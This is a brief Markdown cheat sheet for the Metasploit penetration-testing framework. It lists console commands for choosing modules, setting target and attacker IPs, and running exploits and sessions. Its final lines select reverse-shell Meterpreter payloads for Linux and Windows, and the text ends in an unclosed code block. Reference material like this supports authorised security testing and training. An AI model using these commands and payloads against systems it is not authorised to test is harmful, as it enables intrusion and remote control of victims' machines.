
# Metasploit Cheatsheet 🧠

## Global Commands

| Command | Description |
|--------|-------------|
| `search <name>` | Search modules |
| `use <module>` | Load a module |
| `info` | Show module info |
| `set RHOST <ip>` | Target IP |
| `set LHOST <ip>` | Attacker IP |
| `set PAYLOAD <payload>` | Choose payload |
| `exploit` | Run the exploit |
| `sessions` | View active sessions |
| `background` | Background session |

## Payload Examples

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_http
